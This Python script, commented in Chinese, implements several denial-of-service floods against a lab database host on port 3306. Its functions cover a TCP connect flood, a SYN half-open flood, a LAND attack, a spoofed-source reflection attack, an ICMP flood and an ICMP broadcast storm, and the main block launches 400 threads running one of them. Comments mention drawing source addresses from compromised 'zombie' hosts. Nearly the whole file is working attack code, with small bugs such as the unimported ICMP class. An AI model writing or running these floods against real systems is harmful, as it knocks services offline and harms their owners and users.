# 模拟各类泛洪操作
import random
import socket,threading
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

# 基于TCP三次链接实施泛洪
def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('192.168.230.147',3306))


# scapy 半连接泛洪
def scapy_flood():
    while True:
        random_sport = random.randint(20000,30000)
        pkg = IP(dst='192.168.230.147')/TCP(sport=random_sport,dport=3306,flags='S')
        send(pkg,verbose=False)


# TCP Land泛洪。源ip和目的ip都是被攻击主机
def TCP_Land():
    while True:
        random_sport = random.randint(20000,30000)
        pkg = IP(src='192.168.230.147',dst='192.168.230.147')/TCP(sport=random_sport,dport=3306,flags='S')
        send(pkg,verbose=False)


# 反射攻击
def TCP_Reflex():
    while True:
        random_sport = random.randint(20000,30000)
        pkg = IP(src='192.168.230.130',dst='192.168.230.147')/TCP(sport=random_sport,dport=3306,flags='S')
        send(pkg,verbose=False)


# ICMP泛洪
def ICMP_Flood(targetip):
    # 甚至我还可以准备一个ip字典，这些ip都是我的肉鸡ip，
    while True:
        ip_list = ['192.168.230.147','192.168.230.147','192.168.230.147','192.168.230.147']
        ip = random.choice(ip_list)
        payload = 'nihaosao' * 50
        pkg = IP(src=ip,dst=targetip)/ICMP()/payload * 50   # 一次性发50个数据包
        send(pkg,verbose=False)


# ICMP 广播风暴
def ICMP_Broadcast():
    # 甚至我还可以准备一个ip字典，这些ip都是我的肉鸡ip，
    while True:
        ip_list = ['192.168.230.147','192.168.230.147','192.168.230.147','192.168.230.147']
        ip = random.choice(ip_list)
        payload = 'nihaosao' * 50
        pkg = IP(src=ip,dst='192.168.230.255')/ICMP()/payload * 50   # 一次性发50个数据包
        send(pkg,verbose=False)
        # 直接发给局域网的广播地址，那么同一个网段的主机都会接收到发给该广播地址的数据包


if __name__ == '__main__':
    for i in range(400):
        t = threading.Thread(target=socket_flood)
        # t = threading.Thread(target=scapy_flood)
        # t = threading.Thread(target=TCP_Land)
        # t = threading.Thread(target=TCP_Reflex())
        # t = threading.Thread(target=ICMP_Flood,args=('192.168.230.130',))

        t.start()
